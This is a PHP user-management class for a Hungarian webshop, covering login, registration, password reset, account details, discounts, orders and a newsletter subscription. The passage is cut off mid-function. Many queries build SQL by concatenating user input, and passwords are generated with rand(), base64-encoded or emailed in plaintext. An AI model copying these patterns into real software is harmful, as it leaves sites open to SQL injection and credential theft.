<?
namespace PortalManager;

use MailManager\Mailer;
use MailManager\MailTemplates;
use PortalManager\Template;
use PortalManager\Portal;
use PortalManager\CasadaShop;
use PortalManager\Request;

/**
 * class Users
 *
 */
class Users
{
	private $db = null;
	const TABLE_NAME 			= 'felhasznalok';
	const TABLE_DETAILS_NAME	= 'felhasznalo_adatok';
	const TABLE_CONTAINERS 		= 'user_container';
	const TABLE_CONTAINERS_XREF = 'user_container_xref';

	const USERGROUP_DEMO 		= 'demo';
	const USERGROUP_USER 		= 'user';

	private $user_groupes = array(
		'user' 		=> 'Tag',
		'demo' 		=> 'Demo'
	);

	public 	$user 		= false;
	private $user_data 	= false;
	private $is_cp 		= false;
	private $settings 	= false;
	public 	$days 		= array('hetfo','kedd','szerda', 'csutortok','pentek','szombat','vasarnap');
	public 	$day_names	= array('hetfo' => 'Hétfő','kedd' => 'Kedd','szerda' => 'Szerda', 'csutortok' => 'Csütörtök','pentek' => 'Péntek','szombat' =>'Szombat','vasarnap' => 'Vasárnap');

	function __construct( $arg = array() ){
		$this->db 		= $arg['db'];
		$this->is_cp 	= $arg['admin'];
		$this->settings = $arg[view]->settings;

		if( !$this->settings && isset( $arg['settings'] ) )
		{
			$this->settings = $arg['settings'];
		}

		$this->Portal 	= new Portal( $arg );
		$this->getUser();
	}

	public function getUserGroupes()
	{
		return $this->user_groupes;
	}

	public function getUserGroupe()
	{
		return $this->user_groupes[$this->user_data['data']['user_group']];
	}

	public function getEgyenleg()
	{
		if (!$this->user_data) return false;

		return (float)$this->user_data['data']['cash'];
	}

	function get( $arg = array() )
	{
		$ret 			= array();
		$getby 			= 'email';

		$ret[options] 	= $arg;

		$user = ( !$arg['user'] ) 	? $this->user : $arg['user'];
		$getby = ( !$arg['userby'] ) ? $getby 	: $arg['userby'];

		if(!$user) return false;

		$ret[data] 	= ($user) ? $this->getData($user, $getby) : false;
		$ret[email] = $ret[data][email];


		if( !$ret[data] ) {
			unset($_SESSION['user_email']);
			return false;
		}

		$ret[szallitasi_adat] = $this->getSzallitasiAdatok($ret['data']['ID']);
		$ret[szamlazasi_adat] = $this->getSzamlazasiAdatok($ret['data']['ID']);

		// Ha hiányzik az adat
		if( (is_null($ret[szallitasi_adat]) || is_null($ret[szamlazasi_adat]) ) && !$this->is_cp) {
			if( $_GET['safe'] !='1' ) {
				$miss = '';
				if( is_null($ret[szallitasi_adat]) ) $miss .= 'szallitasi,';
				if( is_null($ret[szamlazasi_adat]) ) $miss .= 'szamlazasi,';
				$miss = rtrim($miss,',');
				\Helper::reload( '/beallitasok?safe=1&missed_details='.$miss );
			}
		}
		$this->user_data 	= $ret;

		$ret['alerts'] = $this->getAlerts( false, $ret['data']['user_group'] );

		return $ret;
	}

	public function addUserToContainer($uid, $containerid)
	{
		if ( !$uid || !$containerid ) {
			throw new \Exception("Hiányzik a felhasználó ID vagy a konténer ID.");
		}


		$real = $this->userExists('ID', $uid);

		if ( !$real ) {
			throw new \Exception("Ezzel az azonosítóval nem rendelkezik egy felhasználó sem!");
		}

		// Check
		$check = $this->userIsInContainer($uid, $containerid);

		if ( $check ) {
			throw new \Exception("Ez a felhasználó már megtalálható a konténerben.");
		}

		$this->db->insert(
			self::TABLE_CONTAINERS_XREF,
			array(
				'user_id' 		=> $uid,
				'container_id' 	=> $containerid
			)
		);

	}

	public function deleteUserFromContainer($uid, $containerid)
	{
		if ( !$uid || !$containerid ) {
			throw new \Exception("Hiányzik a felhasználó ID vagy a konténer ID.");
		}

		// Check
		$check = $this->userIsInContainer($uid, $containerid);

		if ( !$check ) {
			throw new \Exception("Ez a felhasználó nem található a konténerben.");
		}

		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = :cid and user_id = :uid;", array( 'cid' => $containerid, 'uid' => $uid));
	}

	public function userIsInContainer($uid, $containerid)
	{

		$c = $this->db->squery("SELECT ID FROM ".self::TABLE_CONTAINERS_XREF. " WHERE container_id = :cid and user_id = :uid;", array( 'cid' => $containerid, 'uid' => $uid));

		if ($c->rowCount() == 0) {
			return false;
		}

		return true;
	}

	public function delContainer( $id )
	{
		// XREF törlés
		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = :cid", array('cid' => $id));

		// Konténer törlés
		$this->db->squery("DELETE FROM ".self::TABLE_CONTAINERS." WHERE ID = :cid", array('cid' => $id));

	}

	public function saveContainer( $id, $data )
	{
		if ( !$id ) {
			return false;
		}

		if ( empty($data['nev']) ) {
			throw new \Exception("A konténer neve nem lehet üres!");
		}

		$this->db->update(
			self::TABLE_CONTAINERS,
			$data,
			"ID = ".$id
		);
	}

	public function addContainer( $data )
	{
		if ( empty($data['nev']) ) {
			throw new \Exception("A konténer neve nem lehet üres!");
		}

		$this->db->insert(
			self::TABLE_CONTAINERS,
			$data
		);
	}

	public function getContainer( $id )
	{
		if ( !$id ) {
			return false;
		}

		return $this->db->squery("SELECT * FROM ".self::TABLE_CONTAINERS." WHERE ID = :id;",array('id'=>$id))->fetch(\PDO::FETCH_ASSOC);
	}

	public function getContainers()
	{
		$data = array();

		$qs = "SELECT
			c.ID,
			c.nev,
			(SELECT count(ID) FROM ".self::TABLE_CONTAINERS_XREF." WHERE container_id = c.ID) as users_in
		FROM ".self::TABLE_CONTAINERS." as c";

		$qry = $this->db->query( $qs );

		if ($qry->rowCount() == 0 ) {
			return false;
		}

		$list = $qry->fetchAll(\PDO::FETCH_ASSOC);

		foreach ($list as $d)
		{
			$ulid 		= array();
			$ulist 		= array();

			$userlist 	= $this->db->squery("SELECT user_id FROM ".self::TABLE_CONTAINERS_XREF. " WHERE container_id = :cid;", array('cid' => $d[ID]))->fetchAll(\PDO::FETCH_ASSOC);

			if(count($userlist) > 0) {
				foreach ($userlist as $u )
				{
					$ulid[] = $u['user_id'];
					$ulist[$u['user_id']] = $this->getData( $u['user_id'], 'ID');
				}
			}

			$d['in_user_ids'] 	= $ulid;
			$d['user_list'] 	= $ulist;

			unset($ulid);
			unset($userlist);
			unset($ulist);

			$data[] = $d;
		}


		return $data;
	}


	public function getSzallitasiAdatok($uid)
	{
		$data 	= array();
		$qry 	= $this->db->squery("SELECT nev,ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = :id and nev LIKE 'szallitas%'", array( 'id' => (int)$uid ));

		if( $qry->rowCount() == 0 ) return false;

		foreach ($qry->fetchAll(\PDO::FETCH_ASSOC) as $value) {
			$data[str_replace('szallitas_','',$value['nev'])] = $value['ertek'];
		}

		return $data;
	}

	public function getSzamlazasiAdatok($uid)
	{
		$data 	= array();
		$qry 	= $this->db->squery("SELECT nev,ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = :id and nev LIKE 'szamlazas%'", array( 'id' => (int)$uid ));

		if( $qry->rowCount() == 0 ) return false;

		foreach ($qry->fetchAll(\PDO::FETCH_ASSOC) as $value) {
			$data[str_replace('szamlazas_','',$value['nev'])] = $value['ertek'];
		}

		return $data;
	}


	public function getAlerts( $acc_id = false, $user_group = false )
	{
		$has_alerts 	= 0;
		$alerts 		= array();

		$this->alerts['alerts'] 	= $alerts;
		$this->alerts['has_alert'] 	= ( $has_alerts === 0 ) ? false : $has_alerts;

		return $this->alerts;
	}

	public function checkWaterCardDiscount( $user_id )
	{
		if( !$user_id ) return false;

		$qry = $this->db->query("SELECT arena_water_card FROM felhasznalok WHERE ID = $user_id;");

		if( $qry->rowCount() == 0 ) {
			return false;
		}

		$data = $qry->fetch(\PDO::FETCH_ASSOC);

		if( $data['arena_water_card'] == 0 ) return false;

		return true;
	}

	function resetPassword( $data ){
		$jelszo =  rand(1111111,9999999);

		if(!$this->userExists('email',$data['email'])){
			throw new \Exception('Hibás e-mail cím.',1001);
		}

		$this->db->update(self::TABLE_NAME,
			array(
				'jelszo' => \Hash::jelszo($jelszo)
			),
			"email = '".$data['email']."'"
		);

		// Értesítő e-mail az új jelszóról
		$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
		$mail->add( $data['email'] );
		$arg = array(
			'settings' 		=> $this->settings,
			'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!',
			'jelszo' 		=> $jelszo
		);
		$mail->setSubject( 'Elkészült új jelszava' );
		$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'user_password_reset', $arg ) );
		$re = $mail->sendMail();
	}

	function getAllKedvezmeny(){
		// Kedvezmény sávok
		$sv = "SELECT * FROM torzsvasarloi_kedvezmeny ORDER BY ar_from ASC;";

		extract($this->db->q($sv,array('multi' => '1')));

		return $data;
	}

	function getAllElorendelesiKedvezmeny(){
		// Kedvezmény sávok
		$sv = "SELECT * FROM elorendelesi_kedvezmeny ORDER BY ar_from ASC;";

		extract($this->db->q($sv,array('multi' => '1')));

		return $data;
	}

	private function getKedvezmeny($userID){
		$back = array(
			'szazalek' => 0,
			'next_price_step' => 999999999,
			'price_steps' => array()
		);
		$kedv = 0;
		$next_step_price = 999999999;
		$price_steps = array();

		if($userID == '') return $back;
		$doneOrderID = $this->db->query("SELECT ID FROM order_allapot WHERE nev = 'Teljesítve';")->fetch(\PDO::FETCH_COLUMN);

		// Korábban rendelt
		$totalOrderPrice = (float) $this->db->query("
			SELECT 				sum((o.me * o.egysegAr)) as ar
			FROM 				`order_termekek` as o
			WHERE 				o.userID = $userID and
								datediff(now(),o.hozzaadva) <= 365  and
								(SELECT allapot FROM orders WHERE ID = o.orderKey) = 4
		")->fetch(\PDO::FETCH_COLUMN);

		// Hozzáadott érték növelés
		$prev_total = $this->db->query("
				SELECT 				min_ertek
				FROM 				torzsvasarlo_ertekek
				WHERE 				email = (SELECT email FROM felhasznalok WHERE ID = {$userID}) and
									UNIX_TIMESTAMP() < ervenyes
		;")->fetch(\PDO::FETCH_COLUMN);

		if( $prev_total && $prev_total > 0 ) {
			$totalOrderPrice += $prev_total ;
		}

		// Kosár tartalma
		/* * /
		$cartPrice = $this->db->query( $iqq = "
			SELECT 			sum(IF(t.egyedi_ar IS NOT NULL, t.egyedi_ar, getTermekAr(t.marka,IF(t.akcios,t.akcios_brutto_ar,t.brutto_ar))) * c.me) as cartPrice
			FROM 			`shop_kosar` as c
			LEFT OUTER JOIN shop_termekek as t ON t.ID = c.termekID
			WHERE 			c.gepID = ".\Helper::getMachineID().";")->fetch(\PDO::FETCH_COLUMN);

		if($cartPrice > 0){
			$totalOrderPrice += $cartPrice;
		}
		/* */

		// Kedvezmény sávok
		$sv = "SELECT ar_from, ar_to, kedvezmeny FROM torzsvasarloi_kedvezmeny ORDER BY ar_from ASC;";

		extract($this->db->q($sv,array('multi' => '1')));

		foreach($data as $d){

			$from 	= (int)$d[ar_from];
			$to 	= (int)$d[ar_to];
			$k 		= (float)$d[kedvezmeny];

			if($to === 0) $to = 999999999;

			if($totalOrderPrice >= $from && $totalOrderPrice <= $to){
				$kedv = $k;
			}

			$price_steps[] = $from;
		}
		$price_steps[] = 999999999;

		$step = -1;
		foreach ($price_steps as $min ) {
			if( $step === -1 && $totalOrderPrice < $min ) {
				$step = 0;
				break;
			} else if( $totalOrderPrice < $min ) {
				$step = $step + 1;
				break;
			}
			$step++;
		}

		$next_step_price = $price_steps[$step];

		$back[szazalek] = $kedv;
		$back[next_price_step] = $next_step_price;
		$back[price_steps] = $price_steps;

		return $back;
	}

	private function getPreorderKedvezmeny($userID){
		$kedv = 0;
		if($userID == '') return $kedv;
		$doneOrderID = $this->db->query("SELECT ID FROM order_allapot WHERE nev = 'Teljesítve'")->fetch(\PDO::FETCH_COLUMN);

		// Korábban rendelt
		$totalOrderPrice = (float) $this->db->query("SELECT sum((o.me * o.egysegAr)) as ar FROM `order_termekek` as o WHERE o.userID = $userID and o.szuper_akcios = 0 and datediff(now(),o.hozzaadva) <= 365  and (SELECT allapot FROM orders WHERE ID = o.orderKey) = 4")->fetch(\PDO::FETCH_COLUMN);


		// Kosár tartalma
		$cartPrice = $this->db->query( $iqq = "SELECT
				sum(IF(t.egyedi_ar IS NOT NULL, t.egyedi_ar, getTermekAr(t.marka,IF(t.akcios,t.akcios_brutto_ar,t.brutto_ar))) * c.me) as cartPrice
			FROM `shop_kosar` as c
			LEFT OUTER JOIN shop_termekek as t ON t.ID = c.termekID
			WHERE
				t.szuper_akcios = 0 and
				c.gepID = ".\Helper::getMachineID().";")->fetch(\PDO::FETCH_COLUMN);

		if($cartPrice > 0){
			$totalOrderPrice += $cartPrice;
		}

		// Kedvezmény sávok
		$sv = "SELECT * FROM elorendelesi_kedvezmeny ORDER BY ar_from ASC;";

		extract($this->db->q($sv,array('multi' => '1')));

		foreach($data as $d){
			$from 	= (int)$d[ar_from];
			$to 	= (int)$d[ar_to];
			$k 		= (float)$d[kedvezmeny];

			if($to === 0) $to = 999999999;

			if($totalOrderPrice >= $from && $totalOrderPrice <= $to){
				$kedv = $k;
				break;
			}

		}

		return $kedv;
	}

	private function addAccountDetail( $accountID, $key, $value )
	{
		$this->db->insert(
			self::TABLE_DETAILS_NAME,
			array(
				'fiok_id' 	=> $accountID,
				'nev' 		=> $key,
				'ertek' 	=> $value
			)
		);
	}

	public function editAccountDetail( $account_id, $key, $value )
	{
		if( !$account_id ) return false;

		$check = $this->db->query("SELECT id FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = ".$account_id." and nev = '".$key."';");

		if( $check->rowCount() !== 0 ) {
			if( empty($value) )
			{
				$this->db->query("DELETE FROM ".self::TABLE_DETAILS_NAME." WHERE ".sprintf( "fiok_id = %d and nev = '%s'", $account_id, $key));
			}else
			{
				$this->db->update(
					self::TABLE_DETAILS_NAME,
					array(
						'ertek' 			=> $value
					),
					sprintf( "fiok_id = %d and nev = '%s'", $account_id, $key)
				);
			}
		} else {

			$this->db->insert(
				self::TABLE_DETAILS_NAME,
				array(
					'fiok_id' 	=> $account_id,
					'nev' 		=> $key,
					'ertek' 	=> $value
				)
			);
		}
	}

	private function getUser(){
		if($_SESSION[user_email]){
			$this->user = $_SESSION[user_email]	;
		}
	}

	function changeUserAdat($userID, $post){
		extract($post);
		if($nev == '') throw new \Exception('A neve nem lehet üress. Kérjük írja be a nevét!');

		$this->db->update(self::TABLE_NAME,
			array(
				'nev' => $nev
			),
			"ID = $userID"
		);
		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeUserCompanyAdat($userID, $post){
		extract($post);

		unset($post['saveCompany']);

		if($company_name == '') 			throw new \Exception('A cég neve hiányzik. Kérjük adja meg!');
		if($company_address == '') 			throw new \Exception('A cég címe hiányzik. Kérjük adja meg!');
		if($company_hq == '') 				throw new \Exception('A cég telephelye hiányzik. Kérjük adja meg!');
		if($company_adoszam == '') 			throw new \Exception('A cég adószáma hiányzik. Kérjük adja meg!');
		if($company_bankszamlaszam == '') 	throw new \Exception('A cég bankszámlaszáma hiányzik. Kérjük adja meg!');

		foreach ( $post as $key => $value )
		{
			$this->editAccountDetail($userID, $key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeSzallitasiAdat($userID, $post){
		extract($post);
		unset($post[saveSzallitasi]);

		if($nev == '' || $city == '' || $irsz == '' || $uhsz == '' || $phone == '') throw new \Exception('Minden mező kitölétse kötelező!');

		foreach ($post as $key => $value) {
			$this->editAccountDetail( $userID, 'szallitas_'.$key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function changeSzamlazasiAdat($userID, $post){
		extract($post);
		unset($post[saveSzamlazasi]);

		if($nev == '' || $city == '' || $irsz == '' || $uhsz == '') throw new \Exception('Minden mező kitölétse kötelező!');


		foreach ($post as $key => $value) {
			$this->editAccountDetail( $userID, 'szamlazas_'.$key, $value );
		}

		return "Változásokat elmentettük. <a href=''>Frissítés</a>";
	}

	function getOrders($userID, $arg = array()){
		if($userID == '') return false;
		$back = array(
			'done' => array(),
			'progress' => array()
		);

		$q = "SELECT
		o.*,
		oa.nev as allapotNev,
		oa.szin as allapotSzin,
		(SELECT sum(me) FROM `order_termekek` where orderKey = o.ID) as itemNums,
		(SELECT sum(me*egysegAr) FROM `order_termekek` where orderKey = o.ID) as totalPrice
		FROM orders as o
		LEFT OUTER JOIN order_allapot as oa ON oa.ID = o.allapot
		WHERE o.userID = $userID ";

		$q .= " ORDER BY o.allapot ASC, o.idopont ASC ";

		$arg[multi] = '1';
		extract($this->db->q($q,$arg));

		foreach($data as $d){
			if( $d[kedvezmeny_szazalek] > 0) {
				$d[totalPrice] = $d[totalPrice] / ( $d[kedvezmeny_szazalek] / 100 + 1 ) ;
				\PortalManager\Formater::discountPrice( $d[totalPrice], $d[kedvezmeny_szazalek] );
			}

			if($d[allapotNev] == 'Teljesítve'){
				$back[done][] = $d;
			}else{
				$back[progress][] = $d;
			}
		}


		return $back;
	}

	function changePassword($userID, $post){
		extract($post);

		if($userID == '') throw new \Exception('Hiányzik a felhasználó azonosító! Jelentkezzen be újra.');
		if($old == '') throw new \Exception('Kérjük, adja meg az aktuálisan használt, régi jelszót!');
		if($new == '' || $new2 == '') throw new \Exception('Kérjük, adja meg az új jelszavát!');
		if($new !== $new2) throw new \Exception('A megadott jelszó nem egyezik, írja be újra!');

		$jelszo = \Hash::jelszo($old);

		$checkOld = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE ID = $userID and jelszo = '$jelszo'");
		if($checkOld->rowCount() == 0){
			throw new \Exception('A megadott régi jelszó hibás. Póbálja meg újra!');
		}

		$this->db->update(self::TABLE_NAME,
			array(
				'jelszo' => \Hash::jelszo($new2)
			),
			"ID = $userID"
		);
	}

	function getData($what, $by = 'email'){
		if($what == '') return false;
		$q = "SELECT * FROM ".self::TABLE_NAME." WHERE `".$by."` = '$what'";

		extract($this->db->q($q));

		// Felhasználó adatok
		$detailslist = array();

		if ( !$data['ID'] ) {
			return false;
		}

		$details = $this->db->query($q = "SELECT nev, ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = ".$data['ID'].";");

		if ( $details->rowCount() != 0 ) {
			foreach ($details->fetchAll(\PDO::FETCH_ASSOC) as $det) {
				$detailslist[$det['nev']] = $det['ertek'];
			}
		}

		$data = array_merge($data, $detailslist);

		return $data;
	}

	public function logout()
	{
		\Session::kill('user_email');
		\Helper::reload('/'); exit;
	}

	function login($data){
		$re 	= array();

		if(!$this->userExists('email',$data['email'])){
			throw new \Exception('Ezzel az e-mail címmel nem regisztráltak még!',1001);
		}

		if(!$this->validUser($data['email'],$data[pw])){

			if($this->oldUser($data['email'])){
				throw new \Exception('<h3>Weboldalunk megújult, ezért a régi jelszavát nem tudja használni tovább!</h3><br><strong>Jelszóemlékeztető segítségével kérhet új jelszót, amit az e-mail címére elküldünk!<br><a style="color:red;" href="/user/jelszoemlekezteto">ÚJ JELSZÓ MEAGADÁSÁHOZ KATTINTSON IDE!</a></strong>',9000);
			}else {
				throw new \Exception('Hibás bejelentkezési adatok!',9000);
			}
		}

		if(!$this->isActivated($data[email])){
			$resendemailtext = '<form method="post" action=""><div class="text-form">Nem kapta meg az aktiváló e-mailt? <button name="activationEmailSendAgain" value="'.$data['email'].'" class="btn btn-sm btn-danger">Aktiváló e-mail újraküldése!</button></div></form>';

			throw new \Exception('A fiók még nincs aktiválva! <br>'.$resendemailtext ,1001);
		}

		if(!$this->isEnabled($data[email])){
			throw new \Exception('A fiók felfüggesztésre került!',1001);
		}

		// Refresh
		$this->db->update(self::TABLE_NAME,
			array(
				'utoljara_belepett' => NOW
			),
			"email = '".$data[email]."'"
		);

		$re[email] 	= $data[email];
		$re[pw] 	= base64_encode( $data[pw] );
		$re[remember] = ($data[remember_me] == 'on') ? true : false;

		\Session::set('user_email',$data[email]);

		return $re;
	}

	function activate( $activate_arr ){
		$email 	= $activate_arr[0];
		$userID = $activate_arr[1];
		$pwHash = $activate_arr[2];

		if($email == '' || $userID == '' || $pwHash == '') throw new \Exception('Hibás azonosító');

		$q = $this->db->query("SELECT * FROM ".self::TABLE_NAME." WHERE ID = $userID and email = '$email' and jelszo = '$pwHash'");

		if($q->rowCount() == 0) throw new \Exception('Hibás azonosító');

		$d = $q->fetch(\PDO::FETCH_ASSOC);

		if(!is_null($d[aktivalva]))  throw new \Exception('A fiók már aktiválva van!');

		$this->db->update(self::TABLE_NAME,
			array(
				'aktivalva' => NOW
			),
			"ID = $userID"
		);
	}

	public function getResellerFaceList()
	{
		$re = array();

		$q = "SELECT
			f.ID,
			f.nev,
			(SELECT ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = f.ID and nev = 'casadapont_tanacsado_profil') as profil,
			(SELECT ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = f.ID and nev = 'casadapont_tanacsado_titulus') as titulus,
			(SELECT ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = f.ID and nev = 'szallitas_phone') as telefon
		FROM ".self::TABLE_NAME." as f
		WHERE 1=1 and
		f.user_group != '".self::USERGROUP_USER."' and
		(SELECT ertek FROM ".self::TABLE_DETAILS_NAME." WHERE fiok_id = f.ID and nev = 'show_on_facelist') = 1
		ORDER BY f.nev ASC
		";

		$q = $this->db->query($q);

		if($q->rowCount() == 0) return $re;

		$d = $q->fetchAll(\PDO::FETCH_ASSOC);

		$re = $d;

		return $re;
	}

	public function saveByAdmin( $uid, $data )
	{
		if ( empty($data['data']['felhasznalok']['nev']) ) {
			throw new \Exception("Felhasználó nevét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['email']) ) {
			throw new \Exception("Felhasználó email címét kötelező megadni!");
		}

		if (!empty($data['data']['felhasznalok']['jelszo'])) {
			$data['data']['felhasznalok']['jelszo'] = \Hash::jelszo($data['data']['felhasznalok']['jelszo']);
		} else {
			unset($data['data']['felhasznalok']['jelszo']);
		}


		$this->db->update(
			self::TABLE_NAME,
			$data['data']['felhasznalok'],
			"ID = ".$uid
		);

		foreach ($data['data']['felhasznalo_adatok'] as $key => $value ) {
			$this->editAccountDetail($uid, $key, $value);
		}

		// Képfeltöltés, csere
		if ( isset($_FILES['profil']['tmp_name'][0]) && !empty($_FILES['profil']['name'][0]) )
		{
			$profil = \Images::upload(array(
				'src' 		=> 'profil',
				'upDir' 	=> 'src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($data['data']['felhasznalok']['nev']).'-profil',
				'noThumbImg' => true,
				'noWaterMark' => true
			));
			$this->editAccountDetail( $uid, 'casadapont_tanacsado_profil', $profil['file'] );
		}
	}

	public function createByAdmin( $data )
	{

		if ( empty($data['data']['felhasznalok']['nev']) ) {
			throw new \Exception("Felhasználó nevét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['email']) ) {
			throw new \Exception("Felhasználó email címét kötelező megadni!");
		}
		if ( empty($data['data']['felhasznalok']['jelszo']) ) {
			throw new \Exception("Felhasználó jelszavát kötelező megadni!");
		}

		$user_group 	= 'user';
		$distributor 	= 0;
		$jelszo 		= $data['data']['felhasznalok']['jelszo'];

		$data['data']['felhasznalok']['cash'] 		= (empty($data['data']['felhasznalok']['cash']) || !is_numeric($data['data']['felhasznalok']['cash'])) ? 0 : (int)$data['data']['felhasznalok']['cash'];
		$data['data']['felhasznalok']['jelszo'] 	= \Hash::jelszo($data['data']['felhasznalok']['jelszo']);

		if (isset($data['is_reseller'])) {
			$user_group = 'reseller';
		}

		if (isset($data['is_reseller'])) {
			$distributor = 1;
		}

		$insert = $data['data']['felhasznalok'];
		$insert['engedelyezve'] = 1;
		$insert['aktivalva'] 	= NOW;
		$insert['regisztralt'] 	= NOW;
		$insert['user_group'] 	= $user_group;
		$insert['distributor'] 	= $distributor;

		$this->db->insert(
			self::TABLE_NAME,
			$insert
		);

		$new_uid = $this->db->lastInsertId();

		// Képfeltöltés
		if ( isset($_FILES['profil']['tmp_name'][0]) )
		{
			// Profilkép feltöltése
			$profil = \Images::upload(array(
				'src' 		=> 'profil',
				'upDir' 	=> 'src/profil',
				'noRoot' 	=> true,
				'fileName' 	=> \Helper::makeSafeUrl($data['data']['felhasznalok']['nev']).'-profil',
				'noThumbImg' => true,
				'noWaterMark' => true
			));
			$data['data']['felhasznalo_adatok']['casadapont_tanacsado_profil'] = $profil['file'];

		}

		foreach ($data['data']['felhasznalo_adatok'] as $key => $value)
		{
			if( empty($value) ) continue;
			$this->addAccountDetail($new_uid, $key, $value);
		}

		// E-mail értesítés
		if ( isset($data[flag][alert_user]) )
		{
			$mail = new Mailer( $this->settings['page_title'], SMTP_USER, $this->settings['mail_sender_mode'] );
			$mail->add( $data['data']['felhasznalok']['email'] );
			$arg = array(
				'nev' 			=> $data['data']['felhasznalok']['nev'],
				'jelszo' 		=> $jelszo,
				'settings' 		=> $this->settings,
				'data' 			=> $data,
				'infoMsg' 		=> 'Ezt az üzenetet a rendszer küldte. Kérjük, hogy ne válaszoljon rá!'
			);
			$mail->setSubject( 'Fiókja elkészült' );
			$mail->setMsg( (new Template( VIEW . 'templates/mail/' ))->get( 'account_create_byadmin', $arg ) );
			$re = $mail->sendMail();
		}


	}

	function add( $data ){

		$user_group = 'user';

		// Felhasználó használtság ellenőrzése
		if($this->userExists('email',$data['email'])){

			$is_activated = $this->isActivated( $data['email'] );

			if ( !$is_activated ) {
				$resendemailtext = '<form method="post" action=""><div class="text-form">Nem kapta meg az aktiváló e-mailt? <button name="activationEmailSendAgain" value="'.$data['email'].'" class="btn btn-sm btn-danger">Aktiváló e-mail újraküldése!</button></div></form>';
			}

			throw new \Exception('Ezzel az e-mail címmel már regisztráltak! '.$resendemailtext,1002);
		}

		if ( !is_numeric($data['szall_phone']) )
		{
			throw new \Exception('A telefonszám megadásánál kérjük, hogy csak természetes számokat használjon. Pl.: 06102030400',1003);
		}

		if( $data['group'] == 'partner' )
		{
			$user_group = $data['group'];

			if( empty($data['reseller']['company_name']) ) 		throw new \Exception('Kérjük, hogy adja meg a cég nevét!', 		2001);
			if( empty($data['reseller']['company_hq']) ) 		throw new \Exception('Kérjük, hogy adja meg a cég székhelyét!', 2002);
			if( empty($data['reseller']['company_adoszam']) ) 	throw new \Exception('Kérjük, hogy adja meg a cég adószámát!', 	2003);
			if( empty($data['reseller']['company_address']) ) 	throw new \Exception('Kérjük, hogy adja meg a cég postacímét!', 2004);
		}

		if ( true )
		{
			// Szállítási és Számlázási adatok JSON kódja
			$szamlazasi_keys = \Helper::getArrayValueByMatch($data,'szam_');
			$szallitasi_keys = \Helper::getArrayValueByMatch($data,'szall_');

			// Felhasználó regisztrálása
			$this->db->insert(
				self::TABLE_NAME,
				array(
					'email' 			=> trim($data[email]),
					'nev' 				=> trim($data[nev]),
					'jelszo' 			=> \Hash::jelszo($data[pw2]),
					'user_group' 		=> $user_group
				)
			);

			// Új regisztrált felhasználó ID-ka
			$uid = $this->db->lastInsertId();

			/**
			 * Számlázási, szállítási adatok
			 * */

			foreach ($szamlazasi_keys as $key => $value) {
				$this->addAccountDetail( $uid, 'szamlazas_'.$key, $value );
			}
			foreach ($szallitasi_keys as $key => $value) {
				$this->addAccountDetail( $uid, 'szallitas_'.$key, $value );
			}


			/**
			 * RESELLER
			 * */
			if( $data['group'] == 'partner' )
			{
				// Reseller adatok mentése
				/* */
				$this->addAccountDetail( $uid, 'company_name', 		$data['reseller']['company_name'] );
				$this->addAccountDetail( $uid, 'company_hq', 		$data['reseller']['company_hq'] );
				$this->addAccountDetail( $uid, 'company_adoszam', 	$data['reseller']['company_adoszam'] );
				$this->addAccountDetail( $uid, 'company_address', 	$data['reseller']['company_address'] );
				/* */

			}
		}


		// Feliratkozás
		$this->subscribeToWebgalamb($user_group, $data);

		// Aktiváló e-mail kiküldése
		$this->sendActivationEmail( $data['email'], trim($data[pw2]) );

		if ( $water_card ) {
			$this->sendWaterCardAlertEmail( $data, $water_card );
		}

		return $data;
	}

	/**
	 * Feliratkozás Webgalamb csoportba
	 * */
	private function subscribeToWebgalamb( $user_group, $data )
	{
		// Szállítási és Számlázási adatok JSON kódja
		$szamlazasi_keys = \Helper::getArrayValueByMatch($data,'szam_');
		$szallitasi_keys = \Helper::getArrayValueByMatch($data,'szall_');

		switch ($user_group)
		{
			// Felhasználó
			case self::USERGROUP_USER:

				$url 		= 'http://casada.chr.hu/subscriber.php?g=87&f=3917547689';
				$request 	= (new Request)->post( $url, array(
					// E-mail cím
					'subscr' 	=> trim($data[email]),
					// Név
					'f_1013' 	=> trim($data[nev]),
					// Számlázási név
					'f_1016' 	=> trim($szamlazasi_keys[nev]),
					// Számlázási utca, házszám
					'f_1017' 	=> trim($szamlazasi_keys[uhsz]),
					// Számlázási Város
					'f_1021' 	=> trim($szamlazasi_keys[city]),
					// Számlázási Irányítószám
					'f_1018' 	=> trim($szamlazasi_keys[irsz]),
					// Számlázási Megye
					'f_1019' 	=> trim($szamlazasi_keys[state]),
					// Szállítási név
					'f_1020' 	=> trim($szallitasi_keys[nev]),
					// Szállítási utca, házszám
					'f_1022' 	=> trim($szallitasi_keys[uhsz]),
					// Szállítási Város
					'f_1023' 	=> trim($szallitasi_keys[city]),
					// Szállítási Irányítószám
					'f_1024' 	=> trim($szallitasi_keys[irsz]),
					// Szállítási Megye
					'f_1025' 	=> trim($szallitasi_keys[state]),
					// (Szállítási) Telefonszám
					'f_1027' 	=> trim($szallitasi_keys[phone]),
					'sub' 		=> 'Feliratkozás'
				) )
				->setDebug( false )
				->send();
			break;
			// Partner
			case self::USERGROUP_PARTNER:

				$url 		= 'http://casada.chr.hu/subscriber.php?g=88&f=7a7daf7d8f';
				$request 	= (new Request)->post( $url, array(
					// E-mail cím
					'subscr' 	=> trim($data[email]),
					// Név
					'f_1030' 	=> trim($data[nev]),
					// Cég Neve
